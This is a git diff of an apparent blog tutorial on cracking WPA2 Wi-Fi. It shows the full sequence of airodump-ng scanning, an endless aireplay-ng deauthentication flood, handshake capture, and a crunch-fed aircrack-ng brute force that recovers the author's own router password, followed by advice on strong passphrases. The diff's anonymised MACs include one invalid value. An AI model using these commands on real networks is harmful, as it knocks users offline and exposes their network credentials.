@@ -68,24 +68,24 @@ Your terminal screen will fill up with something like this:
                                                                                                                                                                                         
  BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                         
- 50:13:95:2E:47:72  -55        0        0    0   3  -1                    <length:  0>                                                                                                  
- 6C:B0:CE:B6:07:53  -42        3        0    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                                
- AC:3B:77:1A:84:50  -75        2        0    0   1  195  WPA2 CCMP   PSK  MySpectrumWiFi4a-2G                                                                                           
- 14:B7:F8:73:97:FE  -77        2        0    0   1  195  WPA2 CCMP   PSK  LAKERTOWN                                                                                                     
- 18:1B:EB:DC:31:A7  -75        2        0    0   1  130  WPA2 CCMP   PSK  Figgy                                                                                                         
- 84:A0:6E:C4:0A:36  -71        3        0    0   1  195  WPA2 CCMP   PSK  MySpectrumWiFi30-2G                                                                                           
- 4C:01:43:EA:E0:66  -62        3        0    0   1  360  WPA2 CCMP   PSK  Oakland                                                                                                       
- 4C:01:43:EA:E0:63  -62        3        0    0   1  360  WPA2 CCMP        <length:  0>                                                                                                  
- 4C:01:43:EA:E0:69  -62        3        0    0   1  360  OPN              <length:  0>                                                                                                  
- 70:F1:96:62:68:21  -63        3        0    0   1  130  WPA2 CCMP   PSK  PHG5C                                                                                                         
- FC:3F:DB:64:A4:6C  -79        2        0    0   1   65  WPA2 CCMP   PSK  DIRECT-6B-HP Officejet 5740                                                                                   
- 26:F5:A2:92:08:33  -66        4        0    0   9  260  OPN              Nice jiraffe-guest                                                                                            
+ 51:EF:63:2E:47:72  -55        0        0    0   3  -1                    <length:  0>                                                                                                  
+ 7C:B1:DF:B9:12:59  -42        3        0    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                                
+ DA:4B:77:1A:84:50  -75        2        0    0   1  195  WPA2 CCMP   PSK  Spectrum                                                                                          
+ 19:7H:8D:73:97:FE  -77        2        0    0   1  195  WPA2 CCMP   PSK  MyWifi                                                                                                     
+ DA:F4:AC:DC:31:A7  -75        2        0    0   1  130  WPA2 CCMP   PSK  Home                                                                                                         
+ 19:AD:EF:C4:0A:36  -71        3        0    0   1  195  WPA2 CCMP   PSK  Verizon                                                                                        
+ 5D:19:32:EA:E0:66  -62        3        0    0   1  360  WPA2 CCMP   PSK  Cali                                                                                                       
+ F5:10:4E:EA:E0:63  -62        3        0    0   1  360  WPA2 CCMP        <length:  0>                                                                                                  
+ A2:72:C3:EA:E0:69  -62        3        0    0   1  360  OPN              <length:  0>                                                                                                  
+ 9D:58:61:62:68:21  -63        3        0    0   1  130  WPA2 CCMP   PSK  INTERNET                                                                                                         
+ ED:3D:D4:64:A4:6C  -79        2        0    0   1   65  WPA2 CCMP   PSK  OfficeJet                                                                                   
+ 33:B5:E2:92:08:33  -66        4        0    0   9  260  OPN              Test-guest                                                                                            
                                                                                                                                                                                         
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                               
                                                                                                                                                                                          
- (not associated)   68:6D:BC:88:4C:9D  -47    0 - 1     95        5                                                                                                                      
- (not associated)   92:0E:63:10:82:3A  -63    0 - 1      0        2                                                                                                                      
- 6C:B0:CE:B6:07:53  38:53:9C:93:ED:4A  -29    0 - 1      0        1     
+ (not associated)   88:D6:CD:88:4C:9D  -47    0 - 1     95        5                                                                                                                      
+ (not associated)   93:1E:44:10:82:3A  -63    0 - 1      0        2                                                                                                                      
+ 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -29    0 - 1      0        1     
 ```
 
 You'll see a list of access points and devices associated with each access point. You'll notice there are acronyms above each column. Here's a list of the ones we care about and what they mean:
@@ -105,7 +105,7 @@ airodump-ng -c [channel number] -w [filename for output] --bssid [MAC Address of
 In my case, the full command looks like this:
 
 ```
-airodump-ng -c 7 -w SCAN_OUTPUT --bssid 6C:B0:CE:B6:07:53 wlan0
+airodump-ng -c 7 -w SCAN_OUTPUT --bssid 7C:B1:DF:B9:12:59 wlan0
 ```
 
 Here's the output:
@@ -115,11 +115,11 @@ Here's the output:
                                                                                                                                                                                         
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                         
- 6C:B0:CE:B6:07:53  -47 100      231       92    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                            
+ 7C:B1:DF:B9:12:59  -47 100      231       92    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                            
                                                                                                                                                                                         
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                              
                                                                                                                                                                                         
- 6C:B0:CE:B6:07:53  38:53:9C:93:ED:4A  -31    0e- 1      0      130     
+ 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -31    0e- 1      0      130     
 ```
 
 You'll be able to see the access point and associated devices. This provides a much cleaner look instead of your terminal screen being full of information. We can see that there is a single device associated with the access point.
@@ -133,7 +133,7 @@ We'll be flooding the access point with deauthentication frames to keep devices 
 While leaving the previous `airodump-ng` command running in a separate tab or window, open another tab to run the deauthentication command. The command is as follows:
 
 ```
-aireplay-ng -0 0 -a 6C:B0:CE:B6:07:53 wlan0
+aireplay-ng -0 0 -a 7C:B1:DF:B9:12:59 wlan0
 ```
 
 The BSSID we specify is that of the access point. It is possible to limit the amount of deauthentication frames to send, but in this case we are sending an infinite amount specified with `-0 0`.
@@ -141,45 +141,139 @@ The BSSID we specify is that of the access point. It is possible to limit the am
 The output for the `aireplay-ng` command will look like this:
 
 ```
-03:24:06  Waiting for beacon frame (BSSID: 6C:B0:CE:B6:07:53) on channel 7
+03:24:06  Waiting for beacon frame (BSSID: 7C:B1:DF:B9:12:59) on channel 7
 NB: this attack is more effective when targeting
 a connected wireless client (-c <client's mac>).
-03:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
-03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
 ```
 
 Your terminal screen will continue to fill with these messages. Keep the command running until you see a `WPA handshake: XX:XX:XX:XX:XX:XX` message on the upper right of the first window running the `airodump-ng` command. That window will look as follows (notice the message on the upper right):
 
 ```
- CH  7 ][ Elapsed: 1 min ][ 2019-09-28 03:25 ][ WPA handshake: 6C:B0:CE:B6:07:53                                         
+ CH  7 ][ Elapsed: 1 min ][ 2019-09-28 03:25 ][ WPA handshake: 7C:B1:DF:B9:12:59                                         
                                                                                                                                                                                     
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                     
- 6C:B0:CE:B6:07:53  -44  96      871       96    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                        
+ 7C:B1:DF:B9:12:59  -44  96      871       96    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                        
                                                                                                                                                                                     
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                          
                                                                                                                                                                     
- 6C:B0:CE:B6:07:53  38:53:9C:93:ED:4A  -41    1e- 1      0       78   
+ 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -41    1e- 1      0       78   
 ```
 
 If you see the message, you have successfully captured the handshake. The last step left to do now is to crack this handshake and reveal the password in plaintext.
 
 ## Cracking the password
 
-Recall that we saved our `airodump-ng` scan to a file named `SCAN_OUTPUT`. You'll see several files in the directory by the same name, but you'll only need the one with a `.cap` extension. From here, there are two approaches to cracking the password. You can use a wordlist and see if one of the passwords in the wordlist is the actual password to the access point, or you can opt to use a program that generates passwords and attempts each one (brute forcing). 
+Recall that we saved our `airodump-ng` scan to a file named `SCAN_OUTPUT`. You'll see several files in the directory by the same name, but you'll only need the one with a `.cap` extension. From here, there are two approaches to cracking the password. You can use a wordlist and see if one of the passwords in the wordlist is the actual password to the access point, or you can opt to use a program that generates passwords and attempts each one (brute forcing).
 
-To put network interfaces back to normal:
+First, we'll go over the approach using a wordlist. The command to begin cracking using a wordlist is as follows:
 
 ```
-sudo service network-manager start
+aircrack-ng -w wordlist.txt SCAN_OUTPUT.cap
 ```
+
+In my case, I used a short wordlist of 4800 passwords to try and crack the handshake. I was not able to find the key, but this is what the output will look like:
+
+```
+                              Aircrack-ng 1.5.2
+
+      [00:00:00] 4800/4799 keys tested (5047.82 k/s)
+
+      Time left: 0 seconds                                     100.02%
+
+                                KEY NOT FOUND
+
+      Master Key     : 8B BB 3C 7A 08 50 43 73 73 BC 27 A0 A0 20 C2 C4
+                       F8 82 0E 55 32 29 28 4C 93 CD 4D C0 3E E3 9C 4C
+
+      Transient Key  : DE 14 79 DB 14 3B ED 7A 0D 80 FC DA 67 77 5C 09
+                       C7 95 27 0C AC 2A 3B 2B 08 5F B5 22 B5 F6 F7 0F
+                       C5 50 68 68 85 00 1E 80 33 1B F8 D9 FE E2 5B F4
+                       71 EE D0 87 E4 57 ED 21 2D 66 CC 0B A7 A7 0D 1D
+
+      EAPOL HMAC     : 35 D8 56 95 03 0B DF 6B 48 C4 DE 21 DB 01 7F E7
+```
+
+The tool will go through every password in the wordlist and try to crack the acess point's password. Wordlists are convenient and can be fast, but if the password is not in the wordlist itself, we'll need to try bruteforcing.
+
+There are likely several tools out there that can generate password combinations, but I used `crunch`. The formula to feed passwords generated by `crunch` into `aircrack-ng` is as follows (notice we need to specify the ESSID this time):
+
+```
+crunch [min password length] [max password length] [characters to use] | aircrack-ng -w - [filename.cap] -e [ESSID]
+```
+
+My full command looks like this:
+
+```
+crunch 14 14 abcdefghijklmnopqrstuvwxyz 1234567890 | aircrack-ng -w - SCAN_OUTPUT-02.cap -e Lower\ The\ Rent
+```
+
+This will be very slow, as the program will attempt every 14-character letter and number combination possible.
+
+In my case, my router has the default password of `pinkcoconut165`. With this knowledge, I can specify further. Instead of attempting every letter and number, I can test for the letters and numbers I know are present in the password. Obviously, this would not be known if we were attacking a completely unknown access point, but I simply want to demonstrate what a successful crack looks like. Using the `-t` option we can specify a pattern. Here's the description from the `man` page:
+
+```
+-t @,%^
+      Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
+      @ will insert lower case characters
+      , will insert upper case characters
+      % will insert numbers
+      ^ will insert symbols
+```
+
+With this flag, we can modify our command as follows:
+
+```
+crunch 14 14 -t @@@@@@@@@@@%%%  | aircrack-ng -w - SCAN_OUTPUT-02.cap -e Lower\ The\ Rent
+```
+
+This will still take long, however, due to the length of the password. Let's cheat a little bit just to show the success screen. Here's the new command where we will only replace digits:
+
+```
+crunch 14 14 -t pinkcoconut%%% | aircrack-ng -w - SCAN_OUTPUT-02.cap -e Lower\ The\ Rent
+```
+
+Success! The password has been found:
+
+```
+                              Aircrack-ng 1.5.2
+
+
+                   [00:00:03] 842 keys tested (262.68 k/s)
+
+
+                        KEY FOUND! [ pinkcoconut165 ]
+
+
+      Master Key     : 1C 7E B9 AE 6E 96 C3 29 A1 CC 8F 70 CE 3D 41 46
+                       6A 02 A6 A3 82 E8 19 D8 34 12 E2 62 A6 79 8B C7
+
+      Transient Key  : C1 FA BC A8 1E 15 B9 3F 7C 59 AA 00 8D 6F 9A C1
+                       F8 D6 F2 A1 BB 8A 0F 71 05 D1 C0 89 88 34 04 CC
+                       5A 10 EF FF 77 08 13 EF CA 8B 10 53 31 5E 65 20
+                       A9 A8 25 7A 37 AA A8 A4 BD 67 6F E4 F9 36 14 C4
+
+      EAPOL HMAC     : 92 FB C9 F7 B9 1B 60 B1 82 9B 90 BA 03 EF E4 83
+```
+
+## Conclusions
+
+Scanning for wifi networks and acquiring handshakes is not difficult. Anyone with minor command line experience can accomplish this. The hardest part will be cracking the password itself, but if an attacker has a powerful computer they can crack a short password in no time. This is an example of why long passwords are important. It is not enough to simply add symbols to a short password. In fact, it is better to get into the habit of creating passphrases as opposed to passwords. A combination of words with lowercase and capital letters in addition so symbols will be more secure than a single word with symbols. In other words, `!ThisIsALongPassword420?` is much harder to crack than `Password420?`
+
+The `crunch` tool has much more functionality that I did not dive into, but I encourage you to read through the `man` pages and learn more about it. It's versatile but still easy to pick up.
+
+There are other tools that we could have used to crack the password, such as `hashcat`. If I'm not mistaken, `hashcat` can take advantage of a GPU which will allow you to crack passwords much faster. However, I wanted to focus on `aircrack-ng`.
+
+This concludes this wifi hacking guide, hope you enjoyed the read!
